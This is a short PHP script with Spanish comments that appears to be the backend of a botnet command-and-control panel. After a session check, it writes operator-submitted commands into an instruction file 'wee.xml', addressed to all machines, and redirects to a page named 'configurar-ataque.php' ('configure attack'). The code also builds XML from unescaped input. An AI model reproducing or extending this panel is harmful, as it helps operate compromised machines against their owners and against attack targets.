<?php
	function filtrar($variable)
	{
		return mysql_real_escape_string(strip_tags($variable));
	}
	$com = filtrar($_POST['commands']);

	//Comprobamos que existe una sesión y tiene la variable conectado, si no, redirige a la página principal
	session_start();
	if(empty($_SESSION['conectado']))
	{
	   header ("Location: index.php");
	   exit;
	}
	error_reporting(0);
	
	if(empty($_SESSION['comandos_anteriores']))
	{
		$_SESSION['comandos_anteriores'] = $com;
	}
	else
	{
		$_SESSION['comandos_anteriores']=$_SESSION['comandos_anteriores'] . "$" . $com;
	}
	$xml = simplexml_load_file('wee.xml');
	foreach ($xml->version as $version)
	{
		$numVersion = (int) $version['num'];
	}
	$numVersion++;
	$xmlContent="<?xml version=\"1.0\"?>\r\n<instructions>\r\n<version num=\"" . $numVersion . "\" />\r\n";
	$id = mt_rand(1,32000);
	
	foreach ($xml->instruction as $instruction)
	{
		$xmlContent=$xmlContent . "<instruction type=\"" . (string) $instruction['type'] . "\" argumento=\"" . (string) $instruction['argumento'] . "\" id_unico_comando=\"" . (string) $instruction['id_unico_comando'] . "\" maquina=\"" . (string) $instruction['maquina'] . "\"/>\r\n";
	}
	if (stristr($com, ' ') === FALSE)
	{
		$xmlContent=$xmlContent . "<instruction type=\"" . $com . "\" argumento=\"\" id_unico_comando=\"".$id."\" maquina=\"all\"/>\r\n";
	}
	else
	{
		$xmlContent=$xmlContent . "<instruction type=\"" . substr($com, 0, strpos($com, " ")) . "\" argumento=\"" . substr(strstr($com, ' '),1) . "\" id_unico_comando=\"".$id."\" maquina=\"all\"/>\r\n";
	}
	$xmlContent = $xmlContent . "</instructions>";
	$fp = fopen('wee.xml',"w+");
	fputs($fp, $xmlContent); 
	fclose($fp);
?>
<?php
	Header("Location: configurar-ataque.php");
?>